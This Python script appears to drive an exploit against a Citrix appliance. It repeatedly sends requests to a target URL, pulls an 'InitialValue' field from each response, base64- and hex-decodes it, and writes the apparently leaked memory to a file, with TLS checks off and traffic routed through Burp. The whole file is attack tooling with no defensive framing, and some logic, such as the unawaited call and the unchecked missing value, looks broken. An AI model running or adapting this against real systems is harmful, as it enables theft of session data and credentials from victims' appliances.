import logging 
from src.http_handler import CitrixConnection
from src.request_configuration import *
from dotenv import load_dotenv
import asyncio
import aiohttp
from src.http_handler import CitrixConnection
from bs4 import BeautifulSoup
import base64
import os

load_dotenv()

proxies = ["http", "127.0.0.1:8080"] # Development testing requests with burp


async def main():
    domain = os.getenv("TARGET_URL")
    connector = aiohttp.TCPConnector(ssl=False) # Remove after devtesting
    async with aiohttp.ClientSession(connector=connector) as session:
        citrix = CitrixConnection(domain, session)

        try:
            with open("output\output.txt", "w") as file:
                while True:
                    response_body = citrix.target(proxy=proxies)

                    soup = BeautifulSoup(response_body, "html.parser")
                    initial_values = soup.find("InitialValue")

                    value = initial_values.text if initial_values else None
                    decoded_str = base64.b64decode(value).decode("utf-8")
                    decoded_hex = bytes.fromhex(decoded_str).decode('utf-8')
                    file.write(decoded_hex)

                
                
        except KeyboardInterrupt:
            print("Keyboard interrupt recieved, terminating program")


if __name__ == "__main__":
    asyncio.run(main())